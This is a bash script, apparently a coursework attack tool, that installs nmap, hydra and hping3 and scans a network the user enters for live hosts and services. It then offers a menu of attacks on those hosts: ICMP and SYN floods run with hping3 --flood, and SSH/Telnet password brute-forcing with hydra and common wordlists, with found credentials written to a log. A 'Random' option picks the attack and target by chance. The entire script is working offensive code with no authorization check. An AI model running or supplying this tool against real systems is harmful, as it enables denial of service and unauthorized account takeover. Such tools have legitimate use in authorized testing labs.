#! /usr/bin/bash


############################################################
##
## CHECKAPPS function checks for the required apps and 
## installs them if not found.
##
############################################################
function CHECKAPPS()
{
	#apt-get update 				#### optional
	echo "Checking for $*"
	for app;
	do
		if [ $(apt list $app --installed 2>/dev/null | grep 'installed' | wc -l) -gt 0 ]
		then
			echo "[++++]  $app is installed"
			sleep 1
		else
			echo "[----]  $app is not installed... installing..."
			sudo apt install $app -y -q
			sleep 1
		fi
	done
	
	#### Verify installation is done by using which command
	abort=false
	appstatus=0
	for app;
	do
		echo "Verifying $app"
		if [ $app == "coreutils" ]
		then
			appstatus=$(which shuf 2>/dev/null | wc -l)
			if [ $appstatus == 0 ]
			then
				echo "[xxxx]  Unable to find shuf, check installation manually."
				echo $app >> .checkresult
				abort=true
			fi
		elif [ $app == "dsniff" ]
		then
			appstatus=$(which arpspoof 2>/dev/null | wc -l)
			if [ $appstatus == 0 ]
			then
				echo "[xxxx]  Unable to find dsniff, check installation manually."
				echo $app >> .checkresult
				abort=true
			fi
		else
			appstatus=$(which $app 2>/dev/null | wc -l)
			if [ $appstatus == 0 ]
			then
				echo "[xxxx] Unable to find $app, check installation manually."
				echo $app >> .checkresult
				abort=true
			fi
		fi
	done
	
	if [ $abort == false ]
	then
		echo "[++++]  Required apps are installed"
	else
		echo "[----]  Listed apps not found. Install manually. Aborting script"
		cat .checkresult
		rm .checkresult
	fi
	echo
	echo
}

##########################################################################################
##
## SCAN function asks the user for a target IP or range
## to scan and scans the target(s) for TCP ports.
## 
###########################################################################################

function SCAN()
{
	read -p '[????]  Enter network to scan [format e.g 10.0.0.1-255 or 10.0.0.0/24 or single IP]: ' NWRNG
	nmap -sL $NWRNG 2> .scan/.chk 1>.scan/.list
	if [ -z "$(grep -E 'Failed to resolve|Unable to split|Illegal netmask' .scan/.chk)" ]
	then
		echo "[++++]  $NWRNG is valid.."
		nmap -sn $NWRNG | grep 'Nmap scan report' | awk '{print $NF}' | tr -d '()' > .scan/.list
		NUM=$(cat .scan/.list | wc -l)
		echo "$NUM hosts found"
		cat .scan/.list
		echo
		sleep 1
	else
		echo "[!!!!]  Check your input"
		SCAN
	fi
	
	iplist=$(cat .scan/.list)
	for i in $iplist;
	do
		echo "Scanning for services on $i"
		sudo nmap -Pn -sS -sV $i -oN .scan/$i.log 1>/dev/null
		echo "Scan results saved to .scan/$i.log"
		echo "$(date): Nmap scan done on $i." >> /var/log/NX220.log
	done
	echo 'Scanning completed'
}

##########################################################################################
##
## ICMPFLOOD function uses hping3 to send the target with ICMP packets
##
###########################################################################################

function ICMPFLOOD()
{
	while true;
	do
		echo 'ICMP Flood chosen: uses hping3 command to send target with ICMP packets'
		echo 'Targets available: '
		iplist=$(cat .scan/.list)
		PS3="Choose a target: "
		select choice in $iplist "Random" "Back to attack menu" "Exit"
		do
			if [[ $choice == "Exit" ]]
			then
				exit
			elif [[ $choice == "Back to attack menu" ]]
			then
				break 2
			elif [[ $choice == "Random" ]]
			then
				rng=$(cat .scan/.list | wc -l)
				rand=$(shuf -i 1-$rng -n 1)
				target=$(head -n$rand .scan/.list | tail -n1)
				echo "$target selected"
			else
				target=$choice
				echo "$target selected"
			fi
			echo 'Running hping3. CTRL + C to stop'
			echo "$(date): ICMP Flood started on $target" >> /var/log/NX220.log
			sudo hping3 --icmp --flood $target
			echo "$(date): ICMP Flood stopped on $target" >> /var/log/NX220.log
			sleep 3
			read -p 'Enter a to return to attack menu or any other character to exit: ' RESTART
			if [[ $RESTART == [aA] ]]
			then
				MENU
			else
				exit
			fi
		done
	done
}

###############################################################################################
##
## SYNFLOOD function uses hping3 to send the target with SYN flagged packets at the target port
##
################################################################################################

function SYNFLOOD()
{
	
	while true;
	do
		echo 'SYN Flood chosen: uses hping3 command to send target with SYN flagged packets'
		echo 'Targets available: '
		iplist=$(cat .scan/.list)
		PS3="Choose a target: "
		select choice in $iplist "Random" "Back to attack menu" "Exit"
		do
			if [[ $choice == "Exit" ]]
			then
				exit
			elif [[ $choice == "Back to attack menu" ]]
			then
				break 2
			elif [[ $choice == "Random" ]]
			then
				rng=$(cat .scan/.list | wc -l)
				rand=$(shuf -i 1-$rng -n 1)
				target=$(head -n$rand .scan/.list | tail -n1)
				echo "$target selected"
			else
				target=$choice
				echo "$target selected"
			fi
			PORTS=$(cat .scan/$target.log | grep open | awk -F/ '{print $1}')
			if [[ ! -z $PORTS ]]
			then
				echo 'Ports available: ' 
				while true;
				do
					PS3='Choose a port: '
					select p in $PORTS "Back to attack menu"
					do	
						if [[ $p == "Back to attack menu" ]]
						then
							PS3="Select your choice"
							break 5
						else
							echo 'Running hping3. CTRL + C to stop'
							echo "$(date): Syn flood started on $target:$p" >> /var/log/NX220.log
							sudo hping3 -S -p $p --flood $target
							echo "$(date): Syn flood stopped on $target:$p" >> /var/log/NX220.log
							sleep 3
							read -p 'Enter a to return to attack menu or any other character to exit: ' RESTART
							if [[ $RESTART == [aA] ]]
							then
								MENU
							else
								exit
							fi
							break
						fi
					done
				done
			else
				echo 'No open ports available. Select another target'
				break
			fi
		done
	done	
}

#######################################################################################
##
## UPDATELIST function asks the user for username/password lists to change to.
## It is called inside the BRUTE function
## 
#######################################################################################

function UPDATELIST()
{
	if [ $1 == 'userlist' ]
	then
		if [ "$(ls $2 2>/dev/null)" ]
		then
			echo "[++++]  File valid"
			userlist=$2
			echo "[++++]  User list is now $userlist"
		else
			echo "[!!!!]  No such file found. Please enter the path for the file list."
			BRUTE
		fi
	elif [ $1 == 'pwlist' ]
	then
		if [ "$(ls $2 2>/dev/null)" ]
		then
			echo "[++++]  File valid"
			passwdlist=$2
			echo "[++++]  Password list is now $passwdlist"
		else
			echo "[!!!!]  No such file found. Please enter the path for the file list."
			BRUTE
		fi
	elif [ $1 == 'bothlist' ]
	then
		if [ "$(ls $2 $3 2>/dev/null)" ]
		then
			echo "[++++]  Files valid"
			userlist=$2
			passwdlist=$3
			echo "[++++]  User list is now $userlist"
			echo "[++++]  Password list is now $passwdlist"
		else
			echo "[!!!!]  Please enter the path for the file list."
			BRUTE
		fi
	fi 
}

#######################################################################################
##
## BRUTE function will perform brute forcing for SSH
## Brute forcing is performed using hydra.
## the found passwords are then stored inside /var/log/NX220.log
## 
#######################################################################################

function BRUTE()
{
	passwdlist=/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
	userlist=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
	
	echo '[****]  Starting Brute force'
	echo "[****]  Selected username list is $userlist"
	echo "[****]  Selected password list is $passwdlist"
	read -p "[????]  Do you wish to specify your own [U]ser or [P]assword list or [B]oth or use [D]efault: " LISTCHOICE
	case $LISTCHOICE in
		U|u)
			read -p "[????]  Enter the userlist you wish to use: " INPUTUSERLIST
			UPDATELIST userlist $INPUTUSERLIST
		;;
		P|p)
			read -p "[????]  Enter the password list you wish to use: " INPUTPWLIST
			UPDATELIST pwlist $INPUTPWLIST
		;;
		B|b)
			read -p "[????]  Enter the userlist you wish to use: " INPUTUSERLIST
			read -p "[????]  Enter the password list you wish to use: " INPUTPWLIST
			UPDATELIST bothlist $INPUTUSERLIST $INPUTPWLIST
		;;
		D|d)
			echo "[****]  Using default lists"
			echo
			echo
		;;
		*)
			echo "[****]  Select from above choices"
		;;
	esac
	
	while true;
	do
		echo 'Brute Force chosen: uses hydra to brute force services such as Telnet and SSH using selected password lists.'
		echo 'Targets available: '
		iplist=$(cat .scan/.list)
		PS3="Choose a target: "
						
		#### menu to choose target IPs #######
		select choice in $iplist "Random" "Back to attack menu" "Exit"
		do
			if [[ $choice == "Exit" ]]
			then
				exit
			elif [[ $choice == "Random" ]]
			then
				rng=$(cat .scan/.list | wc -l)
				rand=$(shuf -i 1-$rng -n 1)
				target=$(head -n$rand .scan/.list | tail -n1)
				echo "$target selected"
			elif [[ $choice == "Back to attack menu" ]]
			then
				break 2
			else
				target=$choice
				echo "$target selected"
			fi
			
			####### menu to choose available services
			SVC=$(cat .scan/$target.log | grep open | grep -E 'ssh|telnet' | tr -d '?' | awk '{print $3}' | sort | uniq)
			echo 'Services available: ' 
			while true;
			do
				if [[ ! -z $SVC ]]
				then
					PS3='Choose a service: '
					select s in $SVC "Back to attack menu"
					do	
						if [[ $s == "Back to attack menu" ]]
						then
							PS3="Select your choice"
							break 5
						else
							####### menu to select service port numbers and commence attack
							portnum=$(cat .scan/$target.log | grep open | grep $s | tr -d '?' | awk -F/ '{print $1}')
							while true;
							do
								PS3="Select port"
								select p in $portnum "Back to attack menu" "Exit"
								do
									if [[ $p == "Exit" ]]
									then
										exit
									elif [[ $p == "Back to attack menu" ]]
									then
										break 6
									else
										echo "$(date): Brute force started on service $s for $target:$p" >> /var/log/NX220.log
										hydra -L $userlist -P $passwdlist -s $p $target $s -t 4 -V -I -f -o /var/log/NX220.log
										echo "$(date): Brute force completed on $target:$p." >> /var/log/NX220.log
									fi
									break
								done
							done
							break
						fi
					done
				else
					echo 'No ssh or telnet services available'
					break 2
				fi
			done
		done
	done
}

#######################################################################################
##
## MENU function lists the available attacks, targets and ports for the user to choose
## 
#######################################################################################

function MENU()
{
	while true;
	do
		PS3='Select your choice: '
		select choice in "ICMP Flood" "Syn Flood" "Brute Force" "Random"
		do	
			case $REPLY in
				1)		
					ICMPFLOOD
					break
				;;
				2)		
					SYNFLOOD
					break
				;;
				3)
					BRUTE
					break
				;;
				4)
					rand=$(shuf -i 1-3 -n 1)
					if [ $rand == 1 ]
					then
						ICMPFLOOD
					elif [ $rand == 2 ]
					then
						SYNFLOOD
					elif [ $rand == 3 ]
					then
						BRUTE
					fi
					break
				;;
				*)
					echo 'Invalid choice. Exiting'
					exit
				;;
		esac
	done
done
}

mkdir .scan 2>/dev/null
sudo touch /var/log/NX220.log
logown=$(id | awk '{print $1}' | awk -F\( '{print $2}' | tr -d ')') 
sudo chown $logown /var/log/NX220.log ##change owner of log file to current user in order to allow writing
CHECKAPPS nmap hydra hping3 coreutils ##coreutils is checked to ensure shuf is available
SCAN
MENU
